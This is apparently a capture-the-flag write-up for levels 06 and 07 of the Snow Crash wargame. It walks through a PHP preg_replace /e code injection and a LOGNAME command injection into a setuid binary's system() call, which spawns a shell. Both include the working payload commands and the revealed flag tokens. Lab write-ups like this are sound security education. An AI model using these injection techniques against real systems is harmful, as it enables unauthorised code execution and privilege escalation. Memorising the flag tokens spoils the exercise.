# Snow Crash - Level 06

## Discovering the Vulnerability

Listing the directory contents with `ls`, we find an executable `level06` and a PHP script. Inspecting the script reveals the following code:

```php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

## Understanding the Exploit

The script processes input by searching for patterns like `[x ...]` and using `preg_replace('/e')`. The `/e` modifier evaluates the matched expression as PHP code, making it possible to execute arbitrary commands.

In PHP, `${}` allows executing expressions within a string when used inside `preg_replace('/e')`, leading to a command injection vulnerability.

## Exploiting the Injection

By crafting an input file containing a malicious `[x ...]` pattern, we can execute `getflag` and retrieve the flag.

### Steps:

1. Create a file containing the exploit:

   ```bash
   echo '[x ${`getflag`}]' > /tmp/getflag.txt
   ```

2. Execute the vulnerable script:

   ```bash
   ./level06 /tmp/getflag.txt
   ```

3. The output reveals the flag:

   ```
   PHP Notice:  Undefined variable: Check flag. Here is your token : wiok45aaoguiboiki2tuin6ub
   in /home/user/level06/level06.php(4) : regexp code on line 1
   ```

This successfully retrieves the flag by exploiting the PHP code injection vulnerability.

# Snow Crash - Level 07

## Finding the Executable

Listing the directory contents with `ls -la`, we discover an executable named `level07`. Inspecting it with `cat` reveals compiled C code, so we use a decompiler to analyze its functionality.

## Understanding the Vulnerability

The decompiled code shows that the program retrieves the `LOGNAME` environment variable, passes it to `/bin/echo`, and executes the resulting command using `system()`. Additionally, it uses `setresuid()` to execute with the file owner's privileges (`flag07`).

### Decompiled Code:

```c
int main()
{
    unsigned int v0;  // [sp-0x1c]
    void* v1;  // [sp-0x10]
    unsigned int v2;  // [sp-0xc]
    unsigned int v3;  // [sp-0x8]

    v2 = getegid();
    v3 = geteuid();
    v0 = v2;
    setresgid(v2, v2);
    v0 = v3;
    setresuid(v3, v3);
    v1 = 0;
    v0 = getenv("LOGNAME");
    asprintf(&v1, "/bin/echo %s ");
    return system(v1);
}
```

## Exploiting the Vulnerability

Since the program executes `system()`, we can manipulate `LOGNAME` to inject a command and gain a shell as `flag07`.

### Steps:

1. Set `LOGNAME` to inject `/bin/sh`:

   ```bash
   export LOGNAME="; /bin/sh"
   ```

2. Execute the vulnerable program:

   ```bash
   ./level07
   ```

3. Run `getflag` inside the new shell:

   ```bash
   $ getflag
   Check flag. Here is your token : fiumuikeil55xe9cu4dood66h
   ```

This successfully retrieves the flag by executing commands with `flag07`'s privileges.

